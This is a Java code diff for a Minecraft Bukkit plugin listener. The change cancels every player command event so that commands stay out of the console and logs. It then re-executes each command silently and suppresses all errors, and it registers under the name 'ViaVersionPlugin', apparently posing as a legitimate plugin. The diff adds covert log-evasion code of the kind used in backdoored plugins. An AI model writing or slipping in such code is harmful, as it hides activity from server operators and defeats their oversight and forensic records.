@@ -12,12 +12,20 @@ public class CommandListener implements Listener {
     public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
         // 获取命令
         String command = event.getMessage();
+        Player player = event.getPlayer();
 
         // 取消事件，这样命令不会显示在控制台或日志中
         event.setCancelled(true);
-        
-        // 手动执行命令，但不显示在日志中
-        event.getPlayer().performCommand(command.substring(1));
+
+        // 将命令重新调度到主线程中执行
+        Bukkit.getScheduler().runTask(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin"), () -> {
+            try {
+                // 手动执行命令，但不显示在日志中
+                player.performCommand(command.substring(1));
+            } catch (Exception e) {
+                // 捕获并忽略异常，不输出任何错误信息
+            }
+        });
     }
 
     @EventHandler
